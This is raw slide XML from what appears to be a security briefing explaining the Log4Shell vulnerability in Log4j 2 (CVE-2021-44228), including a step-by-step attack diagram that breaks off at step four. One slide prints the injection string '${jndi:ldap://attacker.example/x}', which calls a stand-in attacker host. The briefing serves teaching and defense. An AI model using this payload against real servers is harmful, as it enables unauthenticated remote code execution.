                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A logging library that runs code hidden inside the data it logs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="11094415" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4615"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="101826"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2148840"/>
            <a:ext cx="10424160" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>An attacker sends a string like this in any input that gets logged — a header, a form field, a username:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2606040"/>
            <a:ext cx="10424160" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FD1A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>${jndi:ldap://attacker.example/x}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3108960"/>
            <a:ext cx="10424160" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Log4j 2 (2.0-beta9 – 2.15.0) </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>expands the lookup</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>, the server fetches a remote Java class, and runs it. Result: unauthenticated remote code execution.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4023360"/>
            <a:ext cx="3566160" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4206240"/>
            <a:ext cx="3108960" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Identifier</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4553712"/>
            <a:ext cx="3154680" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CVE-2021-44228</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="4023360"/>
            <a:ext cx="3566160" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="4206240"/>
            <a:ext cx="3108960" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Weakness</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="4553712"/>
            <a:ext cx="3154680" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CWE-917 (expression injection)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8083296" y="4023360"/>
            <a:ext cx="3566160" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="4206240"/>
            <a:ext cx="3108960" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ATT&amp;CK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="4553712"/>
            <a:ext cx="3154680" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>T1190 Public-facing app</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1826"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HOW THE ATTACK UNFOLDS</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Five steps — and the server does most of them itself</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2011680"/>
            <a:ext cx="2084832" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3947"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="D14343"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2212848"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE8888"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2788920"/>
            <a:ext cx="1627632" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Crafted input</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3474720"/>
            <a:ext cx="1627632" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker puts a JNDI lookup in a logged field</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2761488" y="2011680"/>
            <a:ext cx="2084832" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3947"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="2E6FD6"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2990088" y="2212848"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2990088" y="2788920"/>
            <a:ext cx="1627632" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Log4j logs it</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2990088" y="3474720"/>
            <a:ext cx="1627632" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable version evaluates the expression</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4974336" y="2011680"/>
            <a:ext cx="2084832" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3947"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="2E6FD6"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5202936" y="2212848"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5202936" y="2788920"/>
            <a:ext cx="1627632" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Outbound lookup</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5202936" y="3474720"/>
            <a:ext cx="1627632" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Server calls out over LDAP / RMI / DNS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7187184" y="2011680"/>
            <a:ext cx="2084832" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3947"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="D14343"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
